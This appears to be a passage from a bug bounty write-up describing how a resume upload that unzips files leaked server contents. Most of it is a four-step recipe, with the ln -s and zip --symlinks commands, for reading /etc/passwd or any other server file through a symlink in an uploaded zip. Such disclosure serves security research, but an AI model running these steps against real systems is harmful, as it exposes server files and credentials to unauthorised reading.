Couple tries later I uploaded a zipped .php file, and the response contained unzipped, base64'd contents of .php. If you read Facebook's "Bounty hunter's guide" you will know where this leads.
The guide describes how one researcher uploaded zip with symlink to /etc/passwd, and couple steps later Facebook returned few lines of /etc/passwd.

I have done exactly the same, so:
1. create a symlink to /etc/passwd (or any other file you want to read)
 ln -s /etc/passwd link
2. zip the created link while preserving symlinks:
 zip --symlinks test.zip link
3. upload test.zip as your resume, system will unzip it
4. the response to POST will have details of (whole) /etc/passwd or other file.
